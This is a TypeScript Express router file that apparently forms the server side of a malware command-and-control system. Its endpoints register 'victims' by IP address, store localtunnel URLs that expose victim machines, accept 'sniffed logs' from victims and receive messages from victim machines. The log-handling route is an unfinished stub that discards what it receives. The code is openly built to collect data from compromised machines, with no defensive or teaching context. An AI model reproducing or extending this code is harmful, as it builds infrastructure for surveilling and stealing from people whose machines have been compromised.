import { Request, Response, Router } from 'express';
import db from '../db';

// Init router
const router = Router();

/* * Router Endpoints * */
// NOTE: IP is primary key
// TODO: Re-do logging system for Backend server

/**
 * Add/Upsert new victim
 */
router.post('/', (req: Request, res: Response) => {
  const { url, ip, createdAt, type } = req.body;
  // Upsert URL if victim has already existed
  const existingVictimIdx = db.getIndex('/victims', ip, 'ip');
  if (existingVictimIdx !== -1) {
    db.push(
      `/victims[${existingVictimIdx}]`,
      {
        url,
      },
      false
    );
    console.info(
      `[${new Date().toLocaleString()}] [Victim] ${url} has been updated for the existing victim in DB`
    );
    return res.status(200).send();
  }
  // Insert brand new victim
  db.push(
    '/victims[]',
    {
      url,
      ip,
      type,
      createdAt,
    },
    true
  );
  console.info(
    `[${new Date().toLocaleString()}] [Victim] ${url} has been saved to DB`
  );
  return res.status(200).send();
});

/**
 * Remove localtunnel's URL off Victim collection
 */
router.delete('/tunnels', (req: Request, res: Response) => {
  const { tunnelURL } = req.query;
  // Find and Delete by Tunnel's URL
  db.delete(`/victims[${db.getIndex('/victims', tunnelURL as string, 'url')}]`);
  console.info(
    `[${new Date().toLocaleString()}] [Victim] Victim at ${tunnelURL} is removed from the DB`
  );
  return res.status(404).send();
});

/**
 * Add the sniffed logs from victim
 */
router.post('/logs', (req: Request, res: Response) => {
  const { ip, log } = req.body;
  for (let i = 0; i < db.count('/victims'); i++) {
    console.log('Print');
  }
  return res.status(200).send();
});

/**
 * Receive messages from victim machine
 */
router.post('/msg', (req: Request, res: Response) => {
  const { msg } = req.body;
  console.info(`[${new Date().toLocaleString()}] [Victim] ${msg}`);
  return res.status(200).send();
});

export default router;
